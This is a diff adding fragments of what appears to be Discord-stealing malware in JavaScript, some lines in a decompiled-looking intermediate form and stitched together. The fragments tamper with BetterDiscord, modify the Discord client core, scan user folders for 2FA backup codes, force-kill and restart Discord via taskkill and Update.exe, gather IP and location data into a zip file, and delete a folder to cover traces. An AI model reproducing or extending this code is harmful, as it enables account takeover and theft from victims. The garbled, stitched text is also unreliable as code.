@@ -1,0 +1,25 @@
+_tmp_0.init = init
+this.pwnBetterDiscord()
+_iterator_10 = <operator>.iterator(client.requires.fs.readdirSync(client.utils.encryption.decryptData(client.config.user.localappdata)))
+(_tmp_114 = folder.toLowerCase()).includes
+client.config.discord.executables.push(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${folder}`)
+_iterator_11 = <operator>.iterator(client.config.discord.executables)
+this.findDiscordCore(executable, client.requires.fs.readdirSync(executable))
+["Videos", "Desktop", "Documents", "Downloads", "Pictures"].forEach(async (type) => {
+                await this.findBackupCodes(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`, client.requires.fs.readdirSync(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`))
+            })
+await this.modify_discord_core()
+await client.requires.child_process.exec('tasklist', async (err, stdout) => {
+                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
+                    if (stdout.includes(executable)) {
+                        await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => {}) // Close
+                        await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {}) // Start
+                    }
+                }
+            })
+const network_data = await this.getIP()
+client.utils.jszip.createTxt("\\Network Data.txt", `IP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}`)
+await client.utils.time.sleep(30000)
+_iterator_13 = <operator>.iterator(client.config.discord.files_path)
+client.requires.fs.existsSync(path.replace("index.js", "liliandorker"))
+client.requires.fs.rmdirSync(path.replace("index.js", "liliandorker"))
